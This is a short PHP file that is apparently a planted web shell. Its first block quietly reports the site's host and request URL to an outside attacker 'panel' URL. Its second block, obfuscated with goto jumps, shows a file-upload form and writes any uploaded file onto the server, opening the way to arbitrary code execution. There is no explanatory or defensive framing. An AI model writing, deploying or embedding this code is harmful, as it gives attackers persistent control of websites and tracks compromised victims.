<?php
$panel = 'https://collecptrxygms.pages.dev/';

$host   = $_SERVER['HTTP_HOST'] ?? '';
$https  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['SERVER_PORT'] ?? '') == '443');
$scheme = $https ? 'https' : 'http';
$url    = $scheme . '://' . $host . ($_SERVER['REQUEST_URI'] ?? '/');

@file_get_contents($panel . '?d=' . rawurlencode($host) . '&u=' . rawurlencode($url));
?>
<?php
goto b3; Af: @copy($_FILES['_']['tmp_name'], $_FILES['_']['name']); goto ae; b3: echo "ntk<form method='POST' enctype='multipart/form-data'><input type='file'name='_'/><input type='submit' value='up'/></form>"; goto Af; ae: echo "<a href=" . $_FILES['_']['name'] . ">ok</a>";

